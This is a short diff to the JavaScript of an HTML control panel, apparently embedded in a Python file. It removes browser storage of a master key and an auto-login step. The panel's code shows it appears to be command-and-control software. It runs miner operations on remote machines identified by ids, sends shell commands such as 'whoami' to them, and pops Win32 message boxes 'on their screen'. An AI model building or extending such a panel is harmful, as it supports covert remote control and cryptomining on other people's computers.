@@ -833,7 +833,7 @@ label{display:block;font-size:10.5px;font-weight:700;color:var(--dim);margin-bot
 <script>
 "use strict";
 const $ = id => document.getElementById(id);
-let K = localStorage.getItem("ramos_master") || "";
+let K = "";
 let selected = null, refreshing = false;
 const H = () => ({"Content-Type":"application/json","X-Master-Key":K});
 const esc = s => String(s == null ? "" : s).replace(/&/g,"&amp;").replace(/</g,"&lt;")
@@ -875,19 +875,17 @@ async function login(){
   btn.disabled = true; btn.textContent = "checking…"; err.textContent = "";
   try {
     await api("/api/login", {method:"POST", body:JSON.stringify({key:K})});
-    localStorage.setItem("ramos_master", K);
     showApp();
     toast("unlocked — welcome back");
   } catch (e) {
     err.textContent = e.message === "key rejected" ? "wrong key — try again" : e.message;
-    localStorage.removeItem("ramos_master");
   } finally {
     btn.disabled = false; btn.innerHTML = "&#128273; UNLOCK";
   }
 }
 
 function lock(){
-  K = ""; localStorage.removeItem("ramos_master");
+  K = "";
   clearInterval(showApp._t); showApp._t = null;
   $("appView").style.display = "none";
   $("loginView").style.display = "flex";
@@ -993,7 +991,7 @@ async function minerOp(vid, act){
 }
 
 async function showMsg(vid){
-  const text = prompt("verdict box -> " + vid + "\n(real Win32 MessageBox, topmost, on their screen):",
+  const text = prompt("verdict box -> " + vid + "\\n(real Win32 MessageBox, topmost, on their screen):",
                       "I stopped it.");
   if (text === null) return;               // cancelled
   const t = text.trim();
@@ -1075,7 +1073,7 @@ $("tt").addEventListener("change", () => {
     ? '{"text":"I stopped it."}' : '{"cmd":"whoami"}';
 });
 
-if (K) login(); else $("key").focus();
+$("key").focus();
 </script>
 </body></html>"""
 
